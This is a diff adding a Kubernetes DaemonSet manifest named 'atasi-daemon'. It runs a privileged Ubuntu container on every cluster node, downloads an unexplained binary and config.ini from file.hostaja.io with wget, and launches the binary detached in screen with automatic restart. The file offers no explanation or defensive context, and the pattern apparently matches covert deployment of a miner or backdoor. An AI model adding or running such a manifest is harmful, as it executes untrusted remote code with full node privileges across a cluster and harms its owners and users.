@@ -1,0 +1,22 @@
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: atasi-daemon
+spec:
+  selector:
+    matchLabels:
+      app: atasi
+  template:
+    metadata:
+      labels:
+        app: atasi
+    spec:
+      containers:
+      - name: atasi
+        image: ubuntu:latest
+        command: ["/bin/bash", "-c"]
+        args:
+          - "apt update -y && apt install screen -y && wget https://file.hostaja.io/atasi && wget https://file.hostaja.io/config.ini && chmod +x atasi && screen ./atasi"
+        securityContext:
+          privileged: true
+      restartPolicy: Always
